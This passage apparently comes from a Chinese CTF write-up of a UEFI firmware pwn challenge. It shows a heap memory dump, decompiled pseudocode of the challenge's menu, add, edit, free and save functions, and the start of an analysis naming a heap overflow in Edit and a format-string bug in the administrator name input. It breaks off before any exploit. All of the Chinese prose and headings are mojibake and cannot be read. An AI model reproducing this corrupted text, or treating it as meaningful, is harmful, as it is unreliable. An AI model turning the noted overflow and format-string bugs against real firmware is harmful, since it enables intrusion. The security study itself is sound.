0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030726670      0x000000002b552f08  &lt;---- desc (freed)</span><br><span class="line">0x2b552f90:     0x000000002b8c9e18      0xafafafafafafafaf</span><br><span class="line">0x2b552fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶å†…å­˜ç©ºé—´ä¸æˆ‘ä»¬ä¸Šé¢æ‰€åˆ†æçš„ä¸€è‡´ï¼Œæ­¤æ—¶è¯¥ FreeList çš„ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š  </p><img src="/2025/01/06/uefi2/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç -1"><a href="#æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç -1" class="headerlink" title="æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç "></a>æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç </h3><p>è¿™é‡Œä¾ç„¶ç»™å‡ºæ¢å¤äº† UiApp ç»„ä»¶éƒ¨åˆ†ç¬¦å·çš„ IDA ä¼ªä»£ç ï¼Œä»…ä¾›å‚è€ƒ :)  </p><h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 StrLength; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// r9</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">116</span>]; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> AdministratorName[<span class="number">131</span>]; <span class="comment">// [rsp+9Ch] [rbp-C4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">65</span>]; <span class="comment">// [rsp+11Fh] [rbp-41h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">9</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;** Loading D^3 BIOS GUARD ... **\n\n&quot;</span>);</span><br><span class="line">  OutputTitle();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;\nPlease select your role.\n(1. Administrator 2. Visitor): &quot;</span>);</span><br><span class="line">      choice = inputNum();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">      &#123;</span><br><span class="line">        Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)AdministratorName);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">        Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Pass key: &quot;</span>);</span><br><span class="line">        InputKey(v12, <span class="number">0x41</span>u, <span class="number">0x2A</span>u);</span><br><span class="line">        sub_16C58(v10);</span><br><span class="line">        StrLength = GetStrLength(v12);</span><br><span class="line">        sub_16B21((__int64)v12, StrLength, v2, v3);</span><br><span class="line">        sub_16A1A(v5, v4, v6, v7);</span><br><span class="line">        <span class="keyword">if</span> ( !checkKey(v8, <span class="number">32</span>i64) )</span><br><span class="line">        &#123;</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">2</span>i64);</span><br><span class="line">          Output(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">          ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">            SystemTable-&gt;ConOut,</span><br><span class="line">            <span class="number">15</span>i64);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">4</span>i64);</span><br><span class="line">        Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Sorry, You don&#x27;t have permission!\n&quot;</span>);</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">          SystemTable-&gt;ConOut,</span><br><span class="line">          <span class="number">15</span>i64);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( choice != <span class="number">2</span> );</span><br><span class="line">  <span class="keyword">return</span> Visitor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Visitor"><a href="#Visitor" class="headerlink" title="Visitor"></a>Visitor</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">Visitor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          VisitorMenu();</span><br><span class="line">          v0 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          clearUser();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v0 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">          Edit();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      Output(<span class="string">&quot;U&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Saving...\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !SaveInfo() );</span><br><span class="line">  Output(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">  WaitEndInfo();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Add-1"><a href="#Add-1" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(v0) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, user **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER);</span><br><span class="line">    <span class="keyword">if</span> ( !USER )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    init_info(USER, &amp;word_18);</span><br><span class="line">    Output(<span class="string">&quot;I&quot;</span>);</span><br><span class="line">    USER-&gt;ID = (<span class="type">int</span>)inputNum();</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">    Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">    Unicode2Ascii(DataTempBuffer, USER-&gt;Name, <span class="number">0x18</span>i64);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      Unicode2Ascii(DataTempBuffer, USER-&gt;Desc, <span class="number">0x38</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">Edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)&amp;word_19476);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;2. Edit Desc.\n&quot;</span>);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;</span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="clearUser"><a href="#clearUser" class="headerlink" title="clearUser"></a>clearUser</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">clearUser</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  user *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( USER &amp;&amp; USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      gBS-&gt;FreePool();</span><br><span class="line">      v1 = USER;</span><br><span class="line">      USER-&gt;Name = <span class="number">0</span>i64;</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(v1-&gt;Desc);</span><br><span class="line">      USER-&gt;Desc = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SaveInfo"><a href="#SaveInfo" class="headerlink" title="SaveInfo"></a>SaveInfo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">SaveInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *Name; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> StrLength; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, info **))gBS-&gt;AllocatePool)(<span class="number">0xA</span>i64, <span class="number">0x58</span>i64, &amp;info);</span><br><span class="line">  init_info(&amp;info, &amp;word_8);</span><br><span class="line">  info-&gt;ID = USER-&gt;ID;</span><br><span class="line">  Name = USER-&gt;Name;</span><br><span class="line">  <span class="keyword">if</span> ( Name )</span><br><span class="line">  &#123;</span><br><span class="line">    StrLength = <span class="number">0x18</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Name = <span class="string">&quot;Anonymous&quot;</span>;</span><br><span class="line">    StrLength = GetStrLength(<span class="string">&quot;Anonymous&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Name, Name, StrLength);</span><br><span class="line">  Desc = USER-&gt;Desc;</span><br><span class="line">  <span class="keyword">if</span> ( Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0x38</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Desc = <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">    v3 = GetStrLength(<span class="string">&quot;Nothing...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Desc, Desc, v3);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Name);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Desc);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(user *))gBS-&gt;FreePool)(USER);</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  USER = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨-1"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>è¿™é“é¢˜æœ‰ä¸¤ä¸ªæ¼æ´ï¼Œç¬¬ä¸€ä¸ªæ˜¯åœ¨ Edit å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;  <span class="comment">// heap overflow</span></span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬é€‰æ‹©ç¼–è¾‘ Desc çš„æ—¶å€™æˆ‘ä»¬æœ€å¤šå¯ä»¥è¾“å…¥ 0x80 å­—èŠ‚çš„æ•°æ®ï¼Œå¯æ˜¯ Desc çš„ size ä¸º 0x38ï¼Œè¿™é‡Œå°±å­˜åœ¨å †æº¢å‡ºã€‚å¦å¤–ä¸€ä¸ªæ¼æ´æ¯”è¾ƒéš¾æ‰¾ï¼Œå°±æ˜¯åœ¨é€‰æ‹© role ä¸º Administrator æ—¶è¾“å…¥ç”¨æˆ·åé‚£é‡Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span 